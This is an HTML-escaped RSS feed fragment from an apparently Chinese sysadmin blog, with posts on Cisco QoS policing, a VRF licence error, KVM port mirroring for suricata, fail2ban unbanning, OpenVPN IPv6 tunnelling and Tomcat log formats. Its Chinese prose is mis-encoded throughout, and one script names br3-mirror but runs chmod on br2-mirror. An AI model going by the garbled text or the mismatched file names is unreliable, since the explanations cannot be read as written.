&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å¦‚æœåªé…ç½®CIRã€Bcï¼Œä¸æŒ‡å®šBeï¼Œé‚£ä¹ˆé»˜è®¤Beç­‰äº1500bytesæˆ–è€…CIRæ•°å€¼ / 32ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; class &lt;span class=&#34;m&#34;&gt;500&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  police &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; conform-action transmit  exceed-action set-prec-transmit &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; violate-action drop 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; class &lt;span class=&#34;m&#34;&gt;600&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  police &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1300&lt;/span&gt; conform-action transmit  exceed-action set-prec-transmit &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; violate-action drop 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; class &lt;span class=&#34;m&#34;&gt;700&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  police cir &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt; bc &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; be &lt;span class=&#34;m&#34;&gt;1300&lt;/span&gt; conform-action transmit  exceed-action set-prec-transmit &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; violate-action drop
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;åŒé€ŸåŒæ¡¶&#34;&gt;åŒé€ŸåŒæ¡¶ï¼š&lt;/h5&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240124161442705&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240124-cisco_qos/image-20240124161442705.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Cisco vrfé”™è¯¯ä¹‹the feature does not supported</title>
      <link>https://rendoumi.com/posts/20240124-vrf/</link>
      <pubDate>Wed, 24 Jan 2024 16:03:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-vrf/</guid>
      <description>&lt;p&gt;ä½œä¸ºä¸€ä¸ªè¿ç»´ï¼Œç°åœ¨æèµ·äº†Cisoçš„BGPç”Ÿæ„&lt;/p&gt;
&lt;p&gt;åœ¨Cisco3650ä¸Šå®šä¹‰VRFï¼Œç»“æœæŠ¥é”™ï¼Œä¸€å¤´é›¾æ°´å•Šï¼Œè€Œä¸”å¯¹Ciscoä¹Ÿä¸ç†Ÿæ‚‰å•Šã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#vrf definition mgmt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;% Feature is not supported
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ²¡åŠæ³•æœGoogleå•Šï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sh license right-to-use  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;license right-to-use activate ipservices all  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reload  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;license right-to-use activate ipservices all acceptEULA  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reload  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åæ˜¾ç¤ºipserviceså’Œlanbaseéƒ½æœ‰å°±è¡Œäº†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#sh license right-to-use&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Slot#  License name   Type     Count   Period left 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;----------------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;      ipservices   permanent     N/A   Lifetime
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;      lanbase      permanent     N/A   Lifetime
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Mirror å£ç›´é€šåˆ°Kvmä¸­å»é‡åˆ°çš„å‡ ä¸ªé—®é¢˜</title>
      <link>https://rendoumi.com/posts/20240124-kvm_mirror/</link>
      <pubDate>Wed, 24 Jan 2024 16:02:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-kvm_mirror/</guid>
      <description>&lt;p&gt;ç”±äºå¤§æBGPçº¿è·¯ï¼Œæ‰€ä»¥åœ¨Ciscoè·¯ç”±å™¨ä¸ŠMirroräº†å…¥å£çš„æµé‡åˆ°å¦å¤–ä¸€ä¸ªç«¯å£ï¼Œä¾›&lt;code&gt;suricata&lt;/code&gt;åˆ†æç”¨ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨Mirrorç›´é€škvmè™šæœºè¿‡ç¨‹ä¸­é‡åˆ°ä»¥ä¸‹é—®é¢˜ï¼š&lt;/p&gt;
&lt;p&gt;Mirrorçš„å£æ˜¯Teå£ï¼Œ10Gçš„æµé‡ï¼Œåœ¨å®¿ä¸»æœºä¸Štcpdumpå¯ä»¥çœ‹åˆ°æ‰€æœ‰æµé‡ï¼Œä½†æ˜¯åœ¨kvmä¸Šåˆ™æ–­æ–­ç»­ç»­ï¼Œæµé‡ä¸¢å¤±ä¸€éƒ¨åˆ†ï¼ŒåŸå› å¾ˆç®€å•ï¼š&lt;/p&gt;
&lt;p&gt;æµé‡çš„èšåˆå’Œè½¬å‘æœªé…ç½®å¥½ï¼Œä¸¤æ¡å‘½ä»¤è§£å†³&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;brctl setageing br2 &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;brctl setfd br2 &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½†æ˜¯ï¼Œå¦‚ä½•åœ¨å®¿ä¸»æœºå¯åŠ¨çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œè¿™ä¸¤å¥å‘¢ï¼Ÿç®€å•ï¼Œå¦‚æœç³»ç»Ÿæ˜¯CentOS&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOF&amp;gt;&amp;gt;/sbin/ifup-local  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;brctl setageing br2 0  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;brctl setfd br2 0  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;755&lt;/span&gt; /sbin/ifup-local  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœç³»ç»Ÿæ˜¯Ubuntu&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /etc/network/if-up.d  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOF&amp;gt;&amp;gt;br3-mirror  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;if [ &amp;#34;$IFACE&amp;#34; = br2 ]; then  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;brctl setageing br2 0  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;brctl setfd br2 0  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;fi  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod +x br2-mirror  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨å®¿ä¸»æœºä¸Šé—®é¢˜è§£å†³äº†ï¼Œåœ¨kvmè™šæœºä¸Šåˆé‡åˆ°é—®é¢˜ï¼ŒUbuntuï¼Œå¦‚æœè®©ä¸€ä¸ªç½‘å£å¯åŠ¨ä½†æ²¡æœ‰åœ°å€å‘¢ï¼Ÿ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/network/interfaces  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auto ens7  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iface ens7 inet manual  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    mtu &lt;span class=&#34;m&#34;&gt;1464&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;up ifconfig ens7 up  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢çš„ï¼Œens7å°±æ˜¯mirrorè¿‡æ¥çš„ç½‘å£ï¼Œmtuæ˜¯å› ä¸ºåœ¨ciscoåšmirrorçš„æ—¶å€™æŒ‡å®šäº†å›ºå®šçš„mtu 1464.&lt;/p&gt;
&lt;p&gt;brctlå‘½ä»¤çš„ç”¨æ³•å¯ä»¥å‚è§ä»¥ä¸‹é“¾æ¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.thegeekstuff.com/2017/06/brctl-bridge/&#34;&gt;https://www.thegeekstuff.com/2017/06/brctl-bridge/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;over.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Fail2banæ€ä¹ˆè§£æ”¾å¹¶æ”¾å…¥ç™½åå•</title>
      <link>https://rendoumi.com/posts/20240124-fail2ban_unban/</link>
      <pubDate>Wed, 24 Jan 2024 16:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-fail2ban_unban/</guid>
      <description>&lt;p&gt;mouse çš„æœåŠ¡å™¨è¿æ¥åˆ°äº†å„ä¸ªç½‘ç»œæ ¸å¿ƒè®¾å¤‡ï¼Œæ‰€ä»¥é‡‡ç”¨äº†å¾ˆä¸¥æ ¼çš„ipé™åˆ¶ï¼Œporté™åˆ¶ï¼Œä»¥åŠfail2banæ¥é˜»æ­¢éæ³•è®¿é—®ï¼Œä½†æ˜¯ä¸å·§ï¼ŒæŠŠè‡ªå·±ä¹Ÿç»™æåˆ° jail é‡Œå»äº†ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæ€ä¹ˆè§£å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæŸ¥çœ‹å°é”æƒ…å†µï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fail2ban-client status
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Status  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;- Number of jail:    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;- Jail list:    sshd, sshd-ddos
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ‰ä¸¤ä¸ªjailï¼Œsshdå’Œsshd-ddos&lt;/p&gt;
&lt;p&gt;è¿›ä¸€æ­¥æŸ¥çœ‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fail2ban-client status sshd  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20240124160424122&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240124-fail2ban_unban/image-20240124160424122.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å‘ç°è‡ªå·±è¢«å±è”½äº†ã€‚&lt;/p&gt;
&lt;p&gt;è§£å°çš„æ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fail2ban-client &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; sshd unbanip 103.108.236.5  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£å°åªæ˜¯ä¸´æ—¶çš„ï¼Œæ°¸ä¹…æ”¾å…¥ç™½åå•æœ€é è°±ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/fail2ban/jail.conf  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ignoreip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 103.108.236.5/32  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‡å¯fail2ban&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl restart fail2ban  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å°±okäº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>é…ç½®ä¸€ä¸ªæä¾›IPv6 tunnel over IPv4çš„OpenVPNæœåŠ¡å™¨</title>
      <link>https://rendoumi.com/posts/20240124-vpn_ipv6_ipv4/</link>
      <pubDate>Wed, 24 Jan 2024 14:10:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-vpn_ipv6_ipv4/</guid>
      <description>&lt;p&gt;å…ˆæ™®åŠä¸€ä¸‹IPv6 åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;IPv6 åœ°å€å¤§å°ä¸º 128 ä½ã€‚&lt;/p&gt;
&lt;p&gt;é¦–é€‰ IPv6 åœ°å€è¡¨ç¤ºæ³•ä¸º8ç»„æ•°å­—ç”¨å†’å·åˆ†éš”ï¼Œå…¶ä¸­æ¯ç»„æ˜¯ 8 ä¸ª 16 ä½éƒ¨åˆ†çš„åå…­è¿›åˆ¶å€¼ã€‚IPv6 åœ°å€èŒƒå›´ä» 0000:0000:0000:0000:0000:0000:0000:0000 è‡³ ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffã€‚&lt;/p&gt;
&lt;p&gt;é™¤æ­¤é¦–é€‰æ ¼å¼ä¹‹å¤–ï¼ŒIPv6 åœ°å€è¿˜å¯ä»¥ç”¨å…¶ä»–ä¸¤ç§çŸ­æ ¼å¼æŒ‡å®šï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;çœç•¥å‰å¯¼é›¶
é€šè¿‡çœç•¥å‰å¯¼é›¶æŒ‡å®š IPv6 åœ°å€ã€‚
ä¾‹å¦‚ï¼ŒIPv6 åœ°å€ 1050:0000:0000:0000:0005:0600:300c:326b å¯å†™ä½œ 1050:0:0:0:5:600:300c:326bã€‚&lt;/li&gt;
&lt;li&gt;åŒå†’å·
é€šè¿‡ä½¿ç”¨åŒå†’å·ï¼ˆ::ï¼‰æ›¿æ¢ä¸€ç³»åˆ—é›¶æ¥æŒ‡å®š IPv6 åœ°å€ã€‚
ä¾‹å¦‚ï¼ŒIPv6 åœ°å€ ff06:0:0:0:0:0:0:c3 å¯å†™ä½œ ff06::c3ã€‚
ä¸€ä¸ª IP åœ°å€ä¸­åªå¯ä½¿ç”¨ä¸€æ¬¡åŒå†’å·ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åœ¨ä¸€èˆ¬IPv6ç½‘ç»œç¯å¢ƒä¸‹ï¼Œä¸€ä¸ªå±€åŸŸç½‘çš„å­ç½‘å¤§å°ä¸º/64ï¼Œæ¥å£é€šè¿‡NDPåè®®è·å¾—è‡ªå·±çš„å”¯ä¸€IPv6åœ°å€ï¼ˆå‰64ä½ä¸ºå­ç½‘å‰ç¼€ï¼Œå64ä½ä¸€èˆ¬ç”±æ¥å£æœ¬èº«çš„MACåœ°å€äº§ç”Ÿï¼‰&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬çš„åœºæ™¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æœåŠ¡å™¨çš„IPV4åœ°å€æ˜¯ 1.2.3.4&lt;/li&gt;
&lt;li&gt;æœåŠ¡å™¨çš„IPV6åœ°å€æ˜¯ aaaa:bbbb:cccc:dddd::/64&lt;/li&gt;
&lt;li&gt;IPV4å’ŒIPV6çš„åœ°å€éƒ½åœ¨eth0ä¸Š&lt;/li&gt;
&lt;li&gt;VPNåˆ†é…ç»™å®¢æˆ·ç«¯çš„IPV6åœ°å€æ˜¯aaaa:bbbb:cccc:dddd:80::/112ï¼Œä½¿ç”¨çš„æ¥å£æ˜¯tun0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é…ç½®è¿‡ç¨‹å¦‚ä¸‹ï¼š é¦–å…ˆä¿®æ”¹&lt;code&gt;/etc/sysctl.conf&lt;/code&gt;æ–‡ä»¶&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.ip_forward&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv6.conf.all.forwarding&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv6.conf.all.proxy_ndp &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.conf.all.accept_redirects &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv6.conf.all.accept_redirects &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.conf.all.send_redirects &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ä¸‹æ¥ï¼Œå¯ä»¥å…ˆåšiptableï¼Œä½¿å¾—openvpn serverå¯¹åŒ…è¿›è¡ŒSNAT&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æˆ–è€…
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -t nat -A POSTROUTING -s 10.11.0.0/16 -j SNAT --to 172.16.8.1  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¾‘&lt;code&gt;/etc/openvpn/variables&lt;/code&gt;å˜é‡&lt;/p&gt;</description>
    </item>
    <item>
      <title>Tomcatæ¨èçš„æ—¥å¿—è®°å½•æ ¼å¼</title>
      <link>https://rendoumi.com/posts/20240124-tomcat_log_format/</link>
      <pubDate>Wed, 24 Jan 2024 14:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-tomcat_log_format/</guid>
      <description>&lt;p&gt;æˆ‘ä»¬tomcatçš„æ—¥å¿—è®°å½•æ ¼å¼ä¸ºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;pattern&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i &amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;resolveHosts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;false&amp;#34;&lt;/span&gt;/&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;éƒ½æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;%a - Remote IP address&lt;/li&gt;
&lt;li&gt;%A - Local IP address&lt;/li&gt;
&lt;li&gt;%b - Bytes sent, excluding HTTP headers, or &amp;lsquo;-&amp;rsquo; if zero&lt;/li&gt;
&lt;li&gt;%B - Bytes sent, excluding HTTP headers&lt;/li&gt;
&lt;li&gt;%h - Remote host name (or IP address if resolveHosts is false)&lt;/li&gt;
&lt;li&gt;%H - Request protocol&lt;/li&gt;
&lt;li&gt;%l - Remote logical username from identd (always returns &amp;lsquo;-&amp;rsquo;)&lt;/li&gt;
&lt;li&gt;%m - Request method (GET, POST, etc.)&lt;/li&gt;
&lt;li&gt;%p - Local port on which this request was received&lt;/li&gt;
